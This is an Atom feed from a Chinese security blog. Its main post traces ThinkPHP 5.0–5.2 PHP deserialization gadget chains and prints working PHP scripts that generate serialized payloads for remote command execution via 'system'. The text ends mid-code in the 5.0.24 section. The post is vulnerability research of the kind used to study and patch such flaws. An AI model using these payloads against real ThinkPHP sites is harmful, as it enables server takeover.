<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>yemoli&#39;s blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://yml-sec.top/"/>
  <updated>2020-04-28T15:49:25.728Z</updated>
  <id>https://yml-sec.top/</id>
  
  <author>
    <name>夜莫离、</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>world</title>
    <link href="https://yml-sec.top/2020/04/28/world/"/>
    <id>https://yml-sec.top/2020/04/28/world/</id>
    <published>2020-04-28T15:48:56.000Z</published>
    <updated>2020-04-28T15:49:25.728Z</updated>
    
    <content type="html"><![CDATA[<p>临时页面</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;临时页面&lt;/p&gt;

      
    
    </summary>
    
    
    
      <category term="CTF" scheme="https://yml-sec.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>thinkphp反序列化漏洞分析</title>
    <link href="https://yml-sec.top/2020/03/06/thinkphp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <id>https://yml-sec.top/2020/03/06/thinkphp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</id>
    <published>2020-03-06T02:49:17.000Z</published>
    <updated>2020-03-11T14:26:49.576Z</updated>
    
    <content type="html"><![CDATA[<h1 id="5-1-x"><a href="#5-1-x" class="headerlink" title="5.1.x"></a>5.1.x</h1><blockquote><p>测试环境</p><p>tp5.1.35</p><p>php7.0.9</p></blockquote><h2 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h2><p>框架最后触发执行任意命令的利用点在<code>/thinkphp/library/think/Request.php</code>中的<code>filterValue</code>函数，该函数中存在<code>call_user_func($filter, $value);</code>，通过反序列化我们最终可以实现对<code>$filter, $value</code>两个变量的控制，进而执行任意命令</p><p><img src="/2020/03/06/thinkphp反序列化漏洞分析/1.png" alt="1"></p><p>从头跟一下利用链</p><p>起始触发点在<code>thinkphp/library/think/process/pipes/Windows.php</code>中<code>Windows</code>类的<code>__destruct</code>方法</p><p><img src="/2020/03/06/thinkphp反序列化漏洞分析/2.png" alt="2"></p><p><code>close</code>方法这里用不到，我们跟进一下<code>removeFiles</code>方法</p><p><img src="/2020/03/06/thinkphp反序列化漏洞分析/3.png" alt="3"></p><p>该方法中调用了<code>file_exists</code>函数，通过这个函数我们可以将<code>$filename</code>赋值成一个对象，这样在调用<code>file_exists</code>函数时就会触发实例化类的<code>__toString</code>方法，这样可以全局搜索<code>__toString</code>方法来寻找利用点，这里使用到了<code>thinkphp\library\think\model\concern\Conversion.php</code>中的<code>__toString</code>方法</p><p><img src="/2020/03/06/thinkphp反序列化漏洞分析/4.png" alt="4"></p><p>该方法中调用了<code>toJson</code>方法，跟进一下</p><p><img src="/2020/03/06/thinkphp反序列化漏洞分析/5.png" alt="5"></p><p>继续跟进<code>toArray</code>方法，该方法中存在这样一段代码</p><p><img src="/2020/03/06/thinkphp反序列化漏洞分析/6.png" alt="6"></p><p>在这里我们期望来找到形如<code>$可控变量-&gt;方法(可控参数)</code>这样的调用模式，这样就可以使我们跳到其他类调用其他类的方法，即使方法不可控，我们也可以调用其他类的<code>__call</code>方法进而继续寻找利用链，这里注意到了<code>$relation-&gt;visible($name);</code>这行代码，在这里<code>$name</code>是由<code>$this-&gt;append</code>来决定的，可以知道该变量是可控的，接着来看<code>$relation</code>，首先来看<code>$relation = $this-&gt;getRelation($key);</code>中的<code>getRelation</code>方法</p><p><img src="/2020/03/06/thinkphp反序列化漏洞分析/7.png" alt="7"></p><p>该处返回值为<code>NULL</code>，接着进入到<code>$relation = $this-&gt;getAttr($key);</code>，跟进<code>getAttr</code>方法</p><p><img src="/2020/03/06/thinkphp反序列化漏洞分析/8.png" alt="8"></p><p>该方法返回值为<code>$value</code>，因此接着跟进<code>getData</code>方法</p><p><img src="/2020/03/06/thinkphp反序列化漏洞分析/9.png" alt="9"></p><p>该处返回值为<code>$this-&gt;data[$name]</code>，其中<code>$name</code>取决于<code>$this-&gt;data</code>，这里<code>$this-&gt;data</code>是可控的，那么也就意味着<code>$relation</code>是可控的，那么该处<code>$relation-&gt;visible($name);</code>的模式为<code>$可控变量-&gt;不可控方法(可控参数)</code>，该处的条件可以使我们调用任意不存在<code>visible</code>方法的类的<code>__call</code>方法，接着来全局搜索<code>__call</code>方法，在这里我们利用到了<code>thinkphp/library/think/Request.php</code>中的<code>__call</code>方法</p><p><img src="/2020/03/06/thinkphp反序列化漏洞分析/10.png" alt="10"></p><p>该方法中存在<code>call_user_func_array</code>函数，其中第一个参数我们可以控制，第二个参数由于上面<code>array_unshift</code>函数的原因，其数组中第一个值固定为当前的类对象，这种情况下我们无法去直接在此处执行任意命令，因此我们需要利用此处继续寻找利用点，在Request类中可以发现有如下方法</p><p><img src="/2020/03/06/thinkphp反序列化漏洞分析/11.png" alt="11"></p><p>该方法中存在着<code>call_user_func</code>这个函数，如果想办法来控制这个函数的两个参数就可以执行任意命令，我们需要来寻找一下何处调用了<code>filterValue</code>方法，这里我们选择同类下的input方法</p><p><img src="/2020/03/06/thinkphp反序列化漏洞分析/14.png" alt="14"></p><p><img src="/2020/03/06/thinkphp反序列化漏洞分析/13.png" alt="13"></p><p>该方法中使用<code>array_walk_recursive</code>函数来调用了<code>filterValue</code>方法，在这里<code>$data</code>决定着<code>filterValue</code>的前两个参数，我们目前无法控制，<code>$filter</code>决定着第三个参数，它来源于该行代码</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$filter</span> = <span class="variable">$this</span>-&gt;getFilter(<span class="variable">$filter</span>, <span class="variable">$default</span>);</span><br></pre></td></tr></table></figure><p>跟进<code>getFilter</code>方法</p><p><img src="/2020/03/06/thinkphp反序列化漏洞分析/15.png" alt="15"></p><p>可以看到<code>$filter</code>最终由<code>$this-&gt;filter</code>决定，是可控的，接着为了控制<code>$data</code>的值，我们需要继续寻找调用<code>input</code>方法的方法，这里使用了param方法</p><p><img src="/2020/03/06/thinkphp反序列化漏洞分析/16.png" alt="16"></p><p>函数返回值处调用了<code>input</code>方法</p><p><img src="/2020/03/06/thinkphp反序列化漏洞分析/17.png" alt="17"></p><p>该处<code>$this-&gt;param</code>可控，其值为<code>$_GET</code>的值，我们在访问时加上参数即可控制，但该处$name是不可控的，因此在这里需要继续寻找调用<code>param</code>方法的方法，在此使用了<code>isAjax</code>方法</p><p><img src="/2020/03/06/thinkphp反序列化漏洞分析/18.png" alt="18"></p><p>该处<code>$this-&gt;config[&#39;var_ajax&#39;]</code>是可控的，那么<code>param</code>方法的<code>$name</code>就是可控的，因此input方法中的$name就可控了，这里就可以绕过该处代码使其不受<code>$data = $this-&gt;getData($data, $name);</code>的影响</p><p><img src="/2020/03/06/thinkphp反序列化漏洞分析/19.png" alt="19"></p><p>目前我们可以控制<code>$data</code>和<code>$filter</code>，这也就意味着我们可以执行命令了</p><p>最后梳理下链的流程</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">反序列化触发</span><br><span class="line">|</span><br><span class="line">(<span class="keyword">class</span> Windows)-&gt;__destruct</span><br><span class="line">|</span><br><span class="line">(<span class="keyword">class</span> Windows)-&gt;removeFiles</span><br><span class="line">|</span><br><span class="line">(trait <span class="keyword">Conversion</span>)-&gt;__toString</span><br><span class="line">|</span><br><span class="line">(trait <span class="keyword">Conversion</span>)-&gt;toJson</span><br><span class="line">|</span><br><span class="line">(trait <span class="keyword">Conversion</span>)-&gt;toArray</span><br><span class="line">|</span><br><span class="line">(<span class="keyword">class</span> Request)-&gt;__call</span><br><span class="line">|</span><br><span class="line">(<span class="keyword">class</span> Request)-&gt;isAjax</span><br><span class="line">|</span><br><span class="line">(<span class="keyword">class</span> Request)-&gt;param</span><br><span class="line">|</span><br><span class="line">(<span class="keyword">class</span> Request)-&gt;<span class="keyword">input</span></span><br><span class="line">|</span><br><span class="line">(<span class="keyword">class</span> Request)-&gt;filterValue-&gt;call_user_func()</span><br></pre></td></tr></table></figure><h2 id="payload编写"><a href="#payload编写" class="headerlink" title="payload编写"></a>payload编写</h2><p>理清楚链的流程后对于<code>payload</code>的编写相对来说容易一些，其中在利用的过程中使用到<code>trait Conversion</code>与<code>trait Attribute</code>，他们是不能被实例化的，所以我们需要找到引用了这两个<code>trait</code>的类来进行实例化，这里使用了<code>thinkphp/library/think/Model.php</code>中的<code>Model</code>类</p><p><img src="/2020/03/06/thinkphp反序列化漏洞分析/20.png" alt="20"></p><p>该类的类型为<code>abstract</code>，是一个抽象类，也是无法实例化的，这里还要继续寻找<code>Model</code>类的子类，搜索发现到<code>thinkphp/library/think/model/Pivot.php</code>中的<code>Pivot</code>类，因此<code>exp</code>编写如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">facade</span>\<span class="title">Cookie</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">facade</span>\<span class="title">Session</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Request</span></span>&#123;</span><br><span class="line"><span class="keyword">protected</span> $config = [];</span><br><span class="line">    <span class="keyword">protected</span> $hook = [];</span><br><span class="line">    <span class="keyword">protected</span> $filter;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;filter = <span class="string">"system"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;config = [<span class="string">"var_ajax"</span>=&gt;<span class="string">''</span>];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;hook = [<span class="string">"visible"</span>=&gt;[<span class="keyword">$this</span>,<span class="string">"isAjax"</span>]];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Model</span></span>&#123;</span><br><span class="line"><span class="keyword">private</span> $data = [];</span><br><span class="line"><span class="keyword">protected</span> $append = [];</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;append=[<span class="string">'a'</span>=&gt;[<span class="string">'b'</span>=&gt;<span class="string">'c'</span>]];</span><br><span class="line"><span class="keyword">$this</span>-&gt;data = [<span class="string">'a'</span>=&gt;<span class="keyword">new</span> Request()];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">process</span>\<span class="title">pipes</span>;</span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Pipes</span></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">model</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Model</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">process</span>\<span class="title">pipes</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Process</span>;</span><br><span class="line"><span class="comment">//use think\model\concern\Conversion;</span></span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">Pivot</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Windows</span></span>&#123;</span><br><span class="line"><span class="keyword">private</span> $files = [];</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;files = [<span class="keyword">new</span> Pivot()];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">process</span>\<span class="title">pipes</span>\<span class="title">Windows</span>;</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="keyword">new</span> Windows()));</span><br></pre></td></tr></table></figure><p>利用截图</p><p><img src="/2020/03/06/thinkphp反序列化漏洞分析/21.png" alt="21"></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><blockquote><p><a href="https://xz.aliyun.com/t/6467" target="_blank" rel="noopener">https://xz.aliyun.com/t/6467</a></p><p><a href="https://paper.seebug.org/1040/" target="_blank" rel="noopener">https://paper.seebug.org/1040/</a></p></blockquote><h1 id="5-2-x"><a href="#5-2-x" class="headerlink" title="5.2.x"></a>5.2.x</h1><blockquote><p>测试环境</p><p>tp5.2.0</p><p>php7.3.4</p></blockquote><h2 id="代码分析-1"><a href="#代码分析-1" class="headerlink" title="代码分析"></a>代码分析</h2><p><code>5.2.0</code>版本的链在前半部分与<code>5.1</code>版本相同，通过<code>vendor/topthink/framework/src/think/process/pipes/Windows.php</code>中的<code>windows</code>类的<code>__destruct</code>方法触发，接着通过removeFiles方法触发<code>vendor/topthink/framework/src/think/model/concern/Conversion.php</code>中<code>Conversion</code>的<code>__toString</code>方法</p><p><img src="/2020/03/06/thinkphp反序列化漏洞分析/22.png" alt="22"></p><p>跟进<code>toJson</code>方法</p><p><img src="/2020/03/06/thinkphp反序列化漏洞分析/23.png" alt="23"></p><p>继续跟进<code>toArray</code>方法，需要关注下面的代码段</p><p><img src="/2020/03/06/thinkphp反序列化漏洞分析/24.png" alt="24"></p><p>跟进这个<code>getAttr</code>方法</p><p><img src="/2020/03/06/thinkphp反序列化漏洞分析/25.png" alt="25"></p><p>它的返回值是另一个方法的返回值，跟进这个方法</p><p><img src="/2020/03/06/thinkphp反序列化漏洞分析/26.png" alt="26"></p><p>在该方法中存在着<code>$value   = $closure($value, $this-&gt;data);</code>这样一处动态调用，我们可以探究一下<code>$closure</code>，<code>$value</code>，<code>$this-&gt;data</code>这三处是否可控，其中<code>$this-&gt;data</code>是直接可控的</p><p>那么来看<code>$closure</code>，其值由<code>$this-&gt;withAttr[$fieldName];</code>决定的，其中<code>$this-&gt;withAttr</code>是可控的，现在需要知道<code>$fieldName</code>是否可控，<code>$fieldName</code>的值由<code>$this-&gt;getRealFieldName($name);</code>决定，跟进<code>getRealFieldName</code>方法</p><p><img src="/2020/03/06/thinkphp反序列化漏洞分析/27.png" alt="27"></p><p>这里的<code>$this-&gt;strict</code>默认值为<code>true</code>，那么该函数的返回值为<code>$name</code>，该变量是<code>getValue</code>方法的第一个参数，也就是<code>getAttr</code>方法的参数，如下图</p><p><img src="/2020/03/06/thinkphp反序列化漏洞分析/28.png" alt="28"></p><p>在<code>toArray</code>方法中，该参数为<code>$data</code>的一个键值，如图</p><p><img src="/2020/03/06/thinkphp反序列化漏洞分析/29.png" alt="29"></p><p>在这里可以看到<code>$data</code>是可控的，那么意味着<code>$closure</code>是可控的</p><p>接着看一下<code>$value</code>，在<code>getValue</code>方法中，<code>$relation</code>为<code>flase</code>，所以这里的<code>$value</code>是当作参数传进来的，如图</p><p><img src="/2020/03/06/thinkphp反序列化漏洞分析/30.png" alt="30"></p><p>向前面找可以看到<code>$value</code>是<code>getData</code>方法的返回值，如图</p><p><img src="/2020/03/06/thinkphp反序列化漏洞分析/31.png" alt="31"></p><p>跟进该方法</p><p><img src="/2020/03/06/thinkphp反序列化漏洞分析/32.png" alt="32"></p><p>该处<code>$fieldName</code>, <code>$this-&gt;data</code>都是可控的，这意味着<code>$value</code>是可控的，在这里<code>$closure($value, $this-&gt;data);</code>就完全可控了，我们可以构造如下的动态调用来执行系统命令</p><p><img src="/2020/03/06/thinkphp反序列化漏洞分析/33.png" alt="33"></p><h2 id="payload编写-1"><a href="#payload编写-1" class="headerlink" title="payload编写"></a>payload编写</h2><p>有了上面的分析流程，结合分析5.1的经验，很容易编写</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>;</span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Model</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $withAttr = [];</span><br><span class="line">    <span class="keyword">private</span> $data = [];</span><br><span class="line">    <span class="keyword">private</span> $relation = [];</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;relation = [<span class="string">'yemoli'</span>=&gt;<span class="string">'whoami'</span>];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;data = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;withAttr = [<span class="string">'yemoli'</span>=&gt;<span class="string">'system'</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">process</span>\<span class="title">pipes</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">concern</span>\<span class="title">Conversion</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">Pivot</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Windows</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $files = [];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;files=[<span class="keyword">new</span> Pivot()];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">model</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Model</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">process</span>\<span class="title">pipes</span>\<span class="title">Windows</span>;</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="keyword">new</span> Windows()));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="参考链接-1"><a href="#参考链接-1" class="headerlink" title="参考链接"></a>参考链接</h2><blockquote><p><a href="https://xz.aliyun.com/t/6476" target="_blank" rel="noopener">https://xz.aliyun.com/t/6476</a></p></blockquote><h1 id="5-0-24"><a href="#5-0-24" class="headerlink" title="5.0.24"></a>5.0.24</h1><blockquote><p>测试环境</p><p>Linux</p><p>php5.6</p><p>tp5.0.24</p></blockquote><h2 id="代码分析-2"><a href="#代码分析-2" class="headerlink" title="代码分析"></a>代码分析</h2><p>该版本下利用方式是通过反序列化达到写文件的目的，我们来跟一下链</p><p>开始位置同样是位于<code>thinkphp/library/think/process/pipes/Windows.php</code>中的<code>windows</code>类的<code>__destruct</code>方法，该方法调用<code>removeFiles</code>方法，利用<code>removeFiles</code>可以实现对任意类<code>__toString</code>方法的触发，这里选择触发位于<code>thinkphp/library/think/Model.php</code>中的<code>Model</code>类的<code>__toString</code>方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;toJson();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>跟进<code>toJson</code>方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">toJson</span><span class="params">($options = JSON_UNESCAPED_UNICODE)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> json_encode(<span class="keyword">$this</span>-&gt;toArray(), $options);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>继续跟进<code>toArray</code>，列出关键代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">toArray</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $item    = [];</span><br><span class="line">    $visible = [];</span><br><span class="line">    $hidden  = [];</span><br><span class="line"></span><br><span class="line">    $data = array_merge(<span class="keyword">$this</span>-&gt;data, <span class="keyword">$this</span>-&gt;relation);</span><br><span class="line">    .....</span><br><span class="line">    .....</span><br><span class="line">    .....</span><br><span class="line">    <span class="comment">// 追加属性（必须定义获取器）</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;append)) &#123;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;append <span class="keyword">as</span> $key =&gt; $name) &#123;</span><br><span class="line">            <span class="keyword">if</span> (is_array($name)) &#123;</span><br><span class="line">                <span class="comment">// 追加关联对象属性</span></span><br><span class="line">                $relation   = <span class="keyword">$this</span>-&gt;getAttr($key);</span><br><span class="line">                $item[$key] = $relation-&gt;append($name)-&gt;toArray();</span><br><span class="line">            &#125; <span class="keyword">elseif</span> (strpos($name, <span class="string">'.'</span>)) &#123;</span><br><span class="line">                <span class="keyword">list</span>($key, $attr) = explode(<span class="string">'.'</span>, $name);</span><br><span class="line">                <span class="comment">// 追加关联对象属性</span></span><br><span class="line">                $relation   = <span class="keyword">$this</span>-&gt;getAttr($key);</span><br><span class="line">                $item[$key] = $relation-&gt;append([$attr])-&gt;toArray();</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $relation = Loader::parseName($name, <span class="number">1</span>, <span class="keyword">false</span>);</span><br><span class="line">                <span class="keyword">if</span> (method_exists(<span class="keyword">$this</span>, $relation)) &#123;</span><br><span class="line">                        $modelRelation = <span class="keyword">$this</span>-&gt;$relation();</span><br><span class="line">                        $value         = <span class="keyword">$this</span>-&gt;getRelationData($modelRelation);</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> (method_exists($modelRelation, <span class="string">'getBindAttr'</span>)) &#123;</span><br><span class="line">                        $bindAttr = $modelRelation-&gt;getBindAttr();</span><br><span class="line">                        <span class="keyword">if</span> ($bindAttr) &#123;</span><br><span class="line">                            <span class="keyword">foreach</span> ($bindAttr <span class="keyword">as</span> $key =&gt; $attr) &#123;</span><br><span class="line">                                $key = is_numeric($key) ? $attr : $key;</span><br><span class="line">                                <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;data[$key])) &#123;</span><br><span class="line">                                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="keyword">Exception</span>(<span class="string">'bind attr has exists:'</span> . $key);</span><br><span class="line">                                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                                    $item[$key] = $value ? $value-&gt;getAttr($attr) : <span class="keyword">null</span>;</span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125;</span><br><span class="line">                            <span class="keyword">continue</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    $item[$name] = $value;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    $item[$name] = <span class="keyword">$this</span>-&gt;getAttr($name);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> !<span class="keyword">empty</span>($item) ? $item : [];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们的目的是到达如下代码段</p><p><img src="/2020/03/06/thinkphp反序列化漏洞分析/34.png" alt="34"></p><p>我在该函数中对于<code>__call</code>方法的触发不同于参考文章，直接跟进<code>getRelationData</code>方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">getRelationData</span><span class="params">(Relation $modelRelation)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;parent &amp;&amp; !$modelRelation-&gt;isSelfRelation() &amp;&amp; get_class($modelRelation-&gt;getModel()) == get_class(<span class="keyword">$this</span>-&gt;parent)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;br&gt;fuction called"</span>;</span><br><span class="line">            $value = <span class="keyword">$this</span>-&gt;parent;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 首先获取关联数据</span></span><br><span class="line">            <span class="keyword">if</span> (method_exists($modelRelation, <span class="string">'getRelation'</span>)) &#123;</span><br><span class="line">                $value = 